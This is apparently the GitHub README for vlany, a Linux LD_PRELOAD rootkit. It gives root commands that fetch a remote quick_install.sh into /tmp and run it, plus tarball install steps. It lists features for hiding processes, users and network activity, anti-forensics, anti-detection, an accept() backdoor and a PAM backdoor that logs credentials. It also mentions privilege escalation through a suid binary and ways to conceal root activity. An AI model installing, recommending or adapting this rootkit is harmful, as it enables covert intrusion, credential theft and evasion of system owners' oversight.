#vlany ([wiki](https://github.com/mempodippy/vlany/wiki))
###A Linux (LD_PRELOAD) rootkit

##Installing
 * vlany's [quick_install.sh](https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh) script is the fastest/easiest method of installation.</br>
`root@vlany:~# wget https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh -O /tmp/quick_install.sh && chmod +x /tmp/quick_install.sh && /tmp/quick_install.sh`</br></br>
The quick_install.sh script automatically downloads the latest version of vlany from this repository, untars the archive, then executes the regular installation script from a new random directory in /tmp/. By default, the quick_install.sh script removes the new directory once execution has completely finished.</br>

 * It's very simple to install vlany onto a sytem as it comes with an automated install script.    
To install vlany you want to first download it from our GitHub ( Always up to date and trusted )  
`root@vlany:~# wget https://github.com/mempodippy/vlany/archive/master.tar.gz && tar xvpfz master.tar.gz`

 * Once it's downloaded you just have to run `install.sh` inside vlany-master.   
`root@vlany:~# cd vlany-master && ./install.sh`   
By default this will prompt you with a [tui](https://en.wikipedia.org/wiki/Text-based_user_interface) installation but if cli is prefered you can use the --cli argument to invoke a similar cli installation.</br>

(**ASCIINEMA**) Regular installation on Debian 8 box using suid binary to escalate privileges from tmp user. In a real life scenario, you'll want to play with some environment variables to prevent anyone from seeing your activity when root.</br>
[![asciicast](https://asciinema.org/a/a8u6ca1n2ujmgijgldrcdu425.png)](https://asciinema.org/a/a8u6ca1n2ujmgijgldrcdu425)

##Downloads
[quick_install.sh](https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh)</br>
[vlany.tar.gz](https://github.com/mempodippy/vlany/archive/master.tar.gz)</br>


##Features
  * Process hiding
  * User hiding
  * Network hiding
  * LXC container
  * Anti-Debug
  * Anti-Forensics
  * Persistent (re)installation & Anti-Detection
  * Dynamic linker modifications
  * Backdoors
    * accept() backdoor (derived from Jynx2)
    * PAM backdoor
      * PAM auth logger
  * vlany-exclusive commands

##Known bugs
###Serious bugs
> 1. There is ~~currently only~~ one significant bug in vlany, which unfortunately causes the box to be unable to reboot successfully.
> This bug arises from hide_checks.c @ hidden_xattr. It'll get fixed.
> 2. vlany fails to install correctly on CentOS

###Minor bugs
> 1. There is a [weird bug](https://github.com/mempodippy/vlany/issues/4) where it shows a duplicate line in the w / who commands. This is potentially a way to detect a vlany installation on a box.
> 2. Debian (8): When using apt-get, a small notification pops up indicating that a dynamic linker shared library has been modified. The following is what shows: "/sbin/ldconfig.real: /libx32/ld-linux-x32.so.2 is not a symbolic link"

##[In-depth README.txt](https://raw.githubusercontent.com/mempodippy/vlany/master/README) (very detailed but not maintained)</br>
**NOTE:** vlany is in active development. Changes are constantly being made to this repository, so beware that vlany is very experimental.
